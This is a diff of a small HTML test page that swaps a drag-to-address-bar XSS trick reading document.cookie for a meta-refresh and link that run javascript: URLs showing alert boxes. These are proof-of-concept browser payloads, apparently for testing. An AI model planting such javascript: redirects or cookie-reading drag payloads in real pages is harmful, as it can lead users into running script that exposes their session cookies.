@@ -1,21 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Drag XSS Test</title>
+    <title>test</title>
+
+    <!-- Meta refresh after 3 seconds -->
+    <meta http-equiv="refresh" content="0;url=javascript:alert('example says : you win the prize')">
 </head>
+
 <body>
-
-<h2>Drag this to the address bar 👇</h2>
-
-<a href="#" draggable="true" id="dragme" style="padding:10px;background:red;color:white;cursor:grab;">
-  Drag me
-</a>
-
-<script>
-document.getElementById('dragme').ondragstart = function(e) {
-  e.dataTransfer.setData(
-    'text/plain',
-    'javascript:alert(document.cookie)'
-  );
-};
-</script>
+    <h1>
+        <a href="javascript:alert('example says : you win the prize')" id="a">
+            Mama im a criminal
+        </a>
+    </h1>
+</body>
+</html>
